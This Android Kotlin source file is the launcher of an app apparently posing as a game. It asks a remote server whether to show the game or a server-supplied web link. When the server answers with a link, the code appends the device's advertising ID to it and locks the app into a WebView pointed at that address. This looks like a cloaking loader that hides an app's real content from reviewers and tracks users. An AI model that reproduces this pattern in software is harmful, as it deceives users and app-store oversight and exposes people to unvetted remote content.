package com.tigernganme.fantastic


import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.view.WindowManager
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.tigerganme.fantastic.R
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.HttpUrl
import retrofit2.Call
import retrofit2.Response

class LoaderActivity : AppCompatActivity() {
    fun game() {
        startActivity(Intent(this@LoaderActivity,MainActivity::class.java))
        finish()
    }
    fun startWV() {
        startActivity(Intent(this@LoaderActivity,WebActivity::class.java))
        finish()
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        window.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loader)
        lifecycleScope.launch {
            delay(2000)
            val ind = getSharedPreferences("prefs", Context.MODE_PRIVATE).getInt("ind",2)
            when(ind) {
                0 -> {
                    startWV()
                }
                1 -> {
                    game()
                }
                2 -> {
                    Client.getApi().ans.enqueue(object : retrofit2.Callback<Answer> {
                        override fun onResponse(call: Call<Answer>, response: Response<Answer>) {
                            if(response.body()!=null && response.body()!!.lose!=null) {
                                Client.getApi().ans2.enqueue(object : retrofit2.Callback<Answer2> {
                                    override fun onResponse(
                                        call: Call<Answer2>,
                                        response: Response<Answer2>
                                    ) {
                                        if(response.body()?.link!=null) {
                                            lifecycleScope.launch(Dispatchers.IO) {
                                                val aaid = AdvertisingIdClient.getAdvertisingIdInfo(this@LoaderActivity).id
                                                var url =
                                                    response.body()!!.link
                                                url = url!!.substring(
                                                    0,
                                                    if (url.indexOf("?") < 0) url.length else url.indexOf(
                                                        "?"
                                                    )
                                                )
                                                url = url.substring(
                                                    if (url.indexOf("//") < 0) 0 else url.indexOf("//") + 2
                                                )
                                                val s = url.trim { it <= ' ' }
                                                    .split("/").toTypedArray()
                                                var url1: HttpUrl.Builder = HttpUrl.Builder()
                                                    .scheme("https")
                                                    .host(s[0])
                                                    .addPathSegment(s[1])
                                                url1 = url1
                                                    .addQueryParameter(
                                                        "aaid",
                                                        aaid
                                                    )
                                                lifecycleScope.launch {
                                                    getSharedPreferences("prefs", Context.MODE_PRIVATE).edit()
                                                        .putInt("ind",0)
                                                        .putString("link",url1.toString())
                                                        .apply()
                                                    startWV()
                                                }
                                            }
                                        } else lifecycleScope.launch {
                                            getSharedPreferences("prefs", Context.MODE_PRIVATE).edit()
                                                .putInt("ind",1).apply()
                                            game()
                                        }
                                    }

                                    override fun onFailure(call: Call<Answer2>, t: Throwable) {
                                        lifecycleScope.launch {
                                            getSharedPreferences("prefs", Context.MODE_PRIVATE).edit()
                                                .putInt("ind",1).apply()
                                            game()
                                        }
                                    }

                                })
                            } else  lifecycleScope.launch {
                                getSharedPreferences("prefs", Context.MODE_PRIVATE).edit()
                                    .putInt("ind",1).apply()
                                game()
                            }
                        }

                        override fun onFailure(call: Call<Answer>, t: Throwable) {
                            lifecycleScope.launch {
                                getSharedPreferences("prefs", Context.MODE_PRIVATE).edit()
                                    .putInt("ind",1).apply()
                                game()
                            }
                        }

                    })
                }
            }

        }
    }
}